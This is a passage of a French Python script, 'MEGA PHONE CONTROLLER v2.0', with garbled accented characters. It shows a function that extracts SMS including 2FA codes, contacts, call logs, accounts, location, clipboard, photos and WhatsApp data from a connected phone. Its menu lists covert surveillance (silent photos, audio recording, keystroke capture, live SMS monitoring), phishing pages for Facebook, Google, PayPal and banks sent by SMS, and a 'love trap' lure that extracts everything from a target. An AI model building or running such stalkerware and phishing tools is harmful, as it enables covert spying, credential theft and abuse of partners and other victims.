    {C.YELLOW}âš ï¸  Cette fonction extrait TOUTES les donnÃ©es accessibles.
    
    Ceci simule ce qu'un attaquant pourrait voler en quelques minutes
    s'il avait accÃ¨s Ã  votre tÃ©lÃ©phone.
    
    DonnÃ©es extraites:
    âœ“ SMS (codes 2FA, messages privÃ©s)
    âœ“ Contacts (carnet d'adresses complet)
    âœ“ Historique d'appels
    âœ“ Comptes enregistrÃ©s (Google, Facebook, etc.)
    âœ“ Applications sensibles (banque, crypto, etc.)
    âœ“ Photos et vidÃ©os
    âœ“ DonnÃ©es WhatsApp
    âœ“ Documents
    âœ“ Notifications
    âœ“ Localisation GPS
    âœ“ RÃ©seaux WiFi
    âœ“ Informations systÃ¨me
    âœ“ Processus en cours{C.END}
    """)
    
    confirm = input(f"\n{C.RED}Continuer? (oui/non): {C.END}")
    if confirm.lower() != 'oui':
        print_info("AnnulÃ©")
        return
    
    start_time = time.time()
    results = {}
    
    total_steps = 14
    
    # 1. Infos systÃ¨me
    print(f"\n{C.CYAN}[1/{total_steps}] Informations systÃ¨me...{C.END}")
    results['system'] = get_system_info()
    
    # 2. Comptes
    print(f"\n{C.CYAN}[2/{total_steps}] Comptes enregistrÃ©s...{C.END}")
    results['accounts'] = get_accounts()
    
    # 3. Apps sensibles
    print(f"\n{C.CYAN}[3/{total_steps}] Applications sensibles...{C.END}")
    results['sensitive_apps'] = detect_sensitive_apps()
    
    # 4. SMS
    print(f"\n{C.CYAN}[4/{total_steps}] Extraction SMS...{C.END}")
    results['sms'] = extract_sms()
    
    # 5. Contacts
    print(f"\n{C.CYAN}[5/{total_steps}] Extraction contacts...{C.END}")
    results['contacts'] = extract_contacts()
    
    # 6. Appels
    print(f"\n{C.CYAN}[6/{total_steps}] Historique appels...{C.END}")
    results['calls'] = extract_call_history()
    
    # 7. Screenshot
    print(f"\n{C.CYAN}[7/{total_steps}] Capture d'Ã©cran...{C.END}")
    results['screenshot'] = take_screenshot()
    
    # 8. Notifications
    print(f"\n{C.CYAN}[8/{total_steps}] Notifications...{C.END}")
    results['notifications'] = get_notifications()
    
    # 9. GPS
    print(f"\n{C.CYAN}[9/{total_steps}] Localisation...{C.END}")
    results['location'] = get_location()
    
    # 10. WiFi
    print(f"\n{C.CYAN}[10/{total_steps}] RÃ©seaux WiFi...{C.END}")
    get_wifi_networks()
    
    # 11. Apps
    print(f"\n{C.CYAN}[11/{total_steps}] Applications...{C.END}")
    results['apps'] = list_apps()
    
    # 12. Processus
    print(f"\n{C.CYAN}[12/{total_steps}] Processus en cours...{C.END}")
    get_running_processes()
    
    # 13. Clipboard
    print(f"\n{C.CYAN}[13/{total_steps}] Presse-papiers...{C.END}")
    results['clipboard'] = get_clipboard()
    
    # 14. Photos/WhatsApp (optionnel)
    download_choice = input(f"\n{C.YELLOW}[14/{total_steps}] TÃ©lÃ©charger photos/WhatsApp? (oui/non): {C.END}")
    if download_choice.lower() == 'oui':
        download_photos()
        download_whatsapp()
        download_documents()
    
    # RÃ©sumÃ©
    elapsed = time.time() - start_time
    
    print(f"\n{C.GREEN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}{C.GREEN}âœ… EXTRACTION TERMINÃ‰E{C.END}")
    print(f"{C.GREEN}{'â•'*70}{C.END}\n")
    
    sensitive_count = sum(len(apps) for apps in results.get('sensitive_apps', {}).values())
    
    print(f"""
    ğŸ“Š RÃ‰SUMÃ‰ DE L'EXTRACTION:
    
    âœ“ Comptes extraits: {len(results.get('accounts', []))}
    âœ“ SMS extraits: {results.get('sms', 'N/A')}
    âœ“ Contacts extraits: {results.get('contacts', 'N/A')}
    âœ“ Appels extraits: {results.get('calls', 'N/A')}
    âœ“ Applications: {len(results.get('apps', []))}
    âœ“ Apps sensibles: {sensitive_count}
    âœ“ Notifications: {results.get('notifications', 'N/A')}
    
    â±ï¸  DurÃ©e: {elapsed:.1f} secondes
    ğŸ“ DonnÃ©es sauvegardÃ©es dans: {OUTPUT_BASE}
    
    {C.RED}âš ï¸  Ces donnÃ©es sont TRÃˆS sensibles!{C.END}
    {C.RED}   Un attaquant pourrait:{C.END}
    {C.RED}   - Usurper votre identitÃ©{C.END}
    {C.RED}   - Vider vos comptes bancaires{C.END}
    {C.RED}   - AccÃ©der Ã  vos conversations privÃ©es{C.END}
    {C.RED}   - Vous faire chanter avec vos photos{C.END}
    """)
    
    # GÃ©nÃ©rer un rapport JSON
    report = {
        "timestamp": datetime.now().isoformat(),
        "device": DEVICE,
        "duration_seconds": elapsed,
        "summary": {
            "accounts": len(results.get('accounts', [])),
            "sms": results.get('sms', 0),
            "contacts": results.get('contacts', 0),
            "calls": results.get('calls', 0),
            "apps": len(results.get('apps', [])),
            "sensitive_apps": sensitive_count
        }
    }
    
    with open(OUTPUT_BASE / "extraction_report.json", "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    
    print_success("Rapport sauvegardÃ©: extraction_report.json")
    
    return results

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MENU PRINCIPAL
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def show_menu():
    clear()
    print(f"""
{C.CYAN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                                                                              â•‘
â•‘     â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â•‘
â•‘     â–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â• â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â•‘
â•‘     â–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â•‘
â•‘     â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â•‘
â•‘     â–ˆâ–ˆâ•‘ â•šâ•â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â•‘
â•‘     â•šâ•â•     â•šâ•â•â•šâ•â•â•â•â•â•â• â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•    â•šâ•â•     â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•â•â•â•‘
â•‘                                                                              â•‘
â•‘                   ğŸ”¥ MEGA PHONE CONTROLLER v2.0 ğŸ”¥                            â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•{C.END}

    {C.YELLOW}ğŸ“± Appareil: {DEVICE if DEVICE else 'Non connectÃ©'}{C.END}
    {C.CYAN}ğŸ“ Sortie: {OUTPUT_BASE}{C.END}

    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚  {C.GREEN}ğŸ“Š EXTRACTION DE DONNÃ‰ES{C.END}                                              â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  [1]  Infos systÃ¨me               [2
    â”‚  [3]  Extraire contacts           [4]  Historique appels               â”‚
    â”‚  [5]  Notifications               [6]  Localisation GPS                â”‚
    â”‚  [7]  RÃ©seaux WiFi                [8]  Applications installÃ©es         â”‚
    â”‚  [9]  Comptes enregistrÃ©s                                              â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  {C.MAGENTA}ğŸ“¸ SURVEILLANCE{C.END}                                                       â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  [10] Capture d'Ã©cran             [11] Enregistrer l'Ã©cran             â”‚
    â”‚  [12] Affichage en direct         [13] Enregistrement audio            â”‚
    â”‚  [14] Prendre photo camÃ©ra        [15] Capture Ã©vÃ©nements clavier      â”‚
    â”‚  [16] Photo silencieuse           [17] Captures en sÃ©rie               â”‚
    â”‚  [18] Surveillance continue       [19] Surveiller SMS live             â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  {C.YELLOW}ğŸ“‚ TÃ‰LÃ‰CHARGEMENT FICHIERS{C.END}                                            â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  [20] TÃ©lÃ©charger photos          [21] TÃ©lÃ©charger WhatsApp            â”‚
    â”‚  [22] TÃ©lÃ©charger documents       [23] Backup complet                  â”‚
    â”‚  [24] EXTRAIRE TOUS MÃ‰DIAS        [25] Apps dÃ©taillÃ©es                 â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  {C.CYAN}ğŸ® CONTRÃ”LE Ã€ DISTANCE{C.END}                                                 â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  [30] Envoyer notification        [31] Ouvrir une URL                  â”‚
    â”‚  [32] Lancer une application      [33] Envoyer du texte                â”‚
    â”‚  [34] Passer un appel             [35] Envoyer SMS rÃ©el                â”‚
    â”‚  [36] Faire vibrer                [37] Shell interactif                â”‚
    â”‚  [38] Lire presse-papiers         [39] DÃ©finir presse-papiers          â”‚
    â”‚  [100] Appel + Haut-parleur       [101] Raccrocher                     â”‚
    â”‚  [102] RÃ©pondre appel             [103] Rejeter appel                  â”‚
    â”‚  [104] Flash Ã©cran                [105] Alarme sonore                  â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  {C.RED}ğŸ” SÃ‰CURITÃ‰ / ANALYSE{C.END}                                                  â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  [40] DÃ©tecter apps sensibles     [41] Permissions des apps            â”‚
    â”‚  [42] Processus en cours          [43] Installer APK                   â”‚
    â”‚  [44] DÃ©sinstaller app            [45] Forcer arrÃªt app                â”‚
    â”‚  [46] Effacer donnÃ©es app         [47] DÃ©sactiver app                  â”‚
    â”‚  [48] IMEI / Identifiants         [49] Infos SIM                       â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  {C.BLUE}ğŸ“± CONTRÃ”LE Ã‰CRAN{C.END}                                                     â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  [50] Ã‰teindre Ã©cran              [51] Allumer Ã©cran                   â”‚
    â”‚  [52] DÃ©verrouiller               [53] Verrouiller                     â”‚
    â”‚  [54] RÃ©gler luminositÃ©           [55] Rotation Ã©cran                  â”‚
    â”‚  [56] ActivitÃ© actuelle           [57] Ouvrir paramÃ¨tres               â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  {C.MAGENTA}ğŸµ MÃ‰DIA / VOLUME{C.END}                                                    â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  [60] Play/Pause                  [61] Piste suivante                  â”‚
    â”‚  [62] Piste prÃ©cÃ©dente            [63] Volume +                        â”‚
    â”‚  [64] Volume -                    [65] Couper son                      â”‚
    â”‚  [66] RÃ©gler volume mÃ©dia         [67] RÃ©gler volume sonnerie          â”‚
    â”‚  [68] CamÃ©ra frontale             [69] CamÃ©ra arriÃ¨re                  â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  {C.YELLOW}ğŸ‘† SIMULATION TOUCHES{C.END}                                                â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  [70] Tap Ã©cran (x,y)             [71] Swipe Ã©cran                     â”‚
    â”‚  [72] Appui long                  [73] Bouton Home                     â”‚
    â”‚  [74] Bouton Retour               [75] Apps rÃ©centes                   â”‚
    â”‚  [76] ParamÃ¨tres rapides          [77] Panneau notifications           â”‚
    â”‚  [78] Taper texte rapide                                               â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  {C.GREEN}ğŸ“¡ CONNECTIVITÃ‰{C.END}                                                       â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  [80] WiFi ON/OFF                 [81] DonnÃ©es mobiles ON/OFF          â”‚
    â”‚  [82] Bluetooth ON/OFF            [83] Mode avion ON/OFF               â”‚
    â”‚  [84] Localisation ON/OFF         [85] Info rÃ©seau dÃ©taillÃ©e           â”‚
    â”‚  [86] Infos stockage                                                   â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  {C.CYAN}ğŸ“ GESTIONNAIRE FICHIERS{C.END}                                               â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  [90] Lister fichiers             [91] Rechercher fichiers             â”‚
    â”‚  [92] TÃ©lÃ©charger fichier         [93] Envoyer fichier                 â”‚
    â”‚  [94] Supprimer fichier           [95] CrÃ©er dossier                   â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  {C.RED}ğŸ’€ MODE HACKER{C.END}                                                          â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  [99] ğŸ’€ EXTRACTION COMPLÃˆTE      [98] Historique navigateur           â”‚
    â”‚  [97] Extraire calendrier         [96] Extraire donnÃ©es app            â”‚
    â”‚  [88] Logs systÃ¨me                [89] RedÃ©marrer tÃ©lÃ©phone            â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  {C.RED}ğŸ£ PHISHING - VOL D'IDENTIFIANTS{C.END}                                        â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  [110] ğŸ“‹ Menu Phishing Complet   [111] ğŸ“˜ Facebook                    â”‚
    â”‚  [112] ğŸ” Google                  [113] ğŸ“· Instagram                   â”‚
    â”‚  [114] ğŸ’¬ WhatsApp                [115] ğŸ¬ Netflix                     â”‚
    â”‚  [116] ğŸ’³ PayPal                  [117] ğŸ¦ Banque                      â”‚
    â”‚  [120] ğŸµ TikTok                  [121] ğŸ‘» Snapchat                    â”‚
    â”‚  [122] ğŸ“§ Outlook/Microsoft       [123] ğŸ›’ Amazon                      â”‚
    â”‚  [118] ğŸš€ ENVOYER LIEN PAR SMS    [119] ğŸ“Š Voir captures               â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  {C.MAGENTA}ğŸ’• PIÃˆGE AMOUR - EXTRACTION TOTALE{C.END}                                   â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  [130] ğŸ’• LANCER PIÃˆGE AMOUR      [131] ğŸ’Œ Envoyer par SMS             â”‚
    â”‚  [132] ğŸ“± ENVOYER VIA WHATSAPP    (Extrait TOUT automatiquement!)      â”‚
    â”‚        Photos, VidÃ©os, WhatsApp, SMS, Contacts, Appels, Telegram...    â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚  [0]  Quitter                                                          â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
    """)

def main():
    global DEVICE, LOVE_TRAP_SERVER
    
    # CrÃ©er les dossiers
    create_output_folders()
    
    # Connexion
    if not connect_device():
        input("\nAppuyez sur EntrÃ©e pour quitter...")
        return
    
    while True:
        show_menu()
        choice = input(f"\n    {C.GREEN}ğŸ‘‰ Votre choix: {C.END}").strip()
        
        try:
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            # EXTRACTION DE DONNÃ‰ES [1-9]
